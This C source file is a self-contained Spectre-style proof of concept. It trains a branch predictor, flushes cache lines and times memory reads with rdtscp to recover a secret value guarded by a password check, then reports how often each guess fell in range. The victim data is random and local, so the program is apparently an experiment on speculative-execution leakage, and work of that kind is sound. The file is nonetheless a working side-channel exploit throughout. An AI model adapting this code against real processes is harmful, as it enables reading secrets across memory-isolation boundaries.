#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <x86intrin.h>
#define SIZE 3000
uint8_t unused1[64];
unsigned int secret[SIZE];
uint8_t unused2[64];
unsigned int array2[SIZE];
uint8_t unused3[64];
unsigned int passwordDigest[SIZE];
uint8_t temp = 0;
void victim_function(int userID, int pwd) {
	if (pwd == passwordDigest[userID]) {
		temp = array2[secret[userID]];
	}
}
int main(int argn, char *argv[]) {
#define CACHELINE 512
	if (argn - 1 != 4) {
		printf(
				"Illegal number of arguments. It must be 4 (#round, #test, #threshold, precisionLoss\n");
		exit(1);
	}
	int blocks = sizeof(array2[0]) * 8;
	int delta = CACHELINE / blocks;
	int class = SIZE / delta + 1;
	int numberOfRuns = strtol(argv[1], NULL, 10);
	int numberOfTest = strtol(argv[2], NULL, 10);
	int cacheHitThreshold = strtol(argv[3], NULL, 10);
	int precisionLoss = strtol(argv[4], NULL, 10);
	int results[class];
	int ok = 0;
	int error = 0;
	int noHit = 0;
	unsigned int timeReg;
	register uint64_t time1, time2;
	srand(time(NULL));
	for (int t = 1; t <= numberOfTest; t++) {
		printf("Test %d di %d\n", t, numberOfTest);
		int userUnderAttack = rand() % SIZE;
		for (int i = 0; i < SIZE; i++) {
			passwordDigest[i] = rand() % SIZE;
			array2[i] = rand() % SIZE;
			secret[i] = rand() % SIZE;
		}
		int wrongPassword = passwordDigest[userUnderAttack] + 1;
		for (int i = 0; i < class; i++) {
			results[i] = 0;
		}
		for (int j = 0; j < numberOfRuns; j++) {
			for (int l = 1; l <= class; l++) {
				for (int i = 0; i < 3; i++) {
					victim_function(1, passwordDigest[1]);
				}
				for (int i = 0; i < SIZE; i++) {
					_mm_clflush(&array2[i]);
					_mm_clflush(&passwordDigest[i]);
				}
				_mm_lfence();
				victim_function(userUnderAttack, 1);
				time1 = __rdtscp(&timeReg);
				timeReg = array2[l * delta];
				time2 = __rdtscp(&timeReg) - time1;
				_mm_lfence();
				if ((int) time2 <= cacheHitThreshold) {
					results[l]++;
				}
			}
		}
		int max = -1;
		int index = -1;
		for (int i = 0; i < class; i++) {
			if (results[i] >= max) {
				max = results[i];
				index = i;
			}
		}
		int rangeMax =
				((index + 1 + precisionLoss) * delta >= SIZE) ?
						SIZE : (index + 1 + precisionLoss) * delta;
		int rangeMin =
				((index - precisionLoss) * delta <= 0) ?
						0 : (index - precisionLoss) * delta;
		if (results[index] > 0 && rangeMin <= secret[userUnderAttack]
				&& rangeMax >= secret[userUnderAttack]) {
			printf("OK: prediction between %d and %d, secret = %d\n", rangeMin,
					rangeMax, secret[userUnderAttack]);
			ok++;
		} else if (results[index] == 0) {
			printf("+++++ NO-HIT: detected 0 hit in %d rounds +++++\n",
					numberOfRuns);
			noHit++;
		} else {
			printf(
					"----- ERROR: prediction between %d and %d, secret = %d -----\n",
					rangeMin, rangeMax, secret[userUnderAttack]);
			error++;
		}
	}
	printf("***TOTAL***\nOK -> %d\nNO-HIT -> %d\nERROR -> %d\n", ok, noHit,
			error);
	return (0);
}
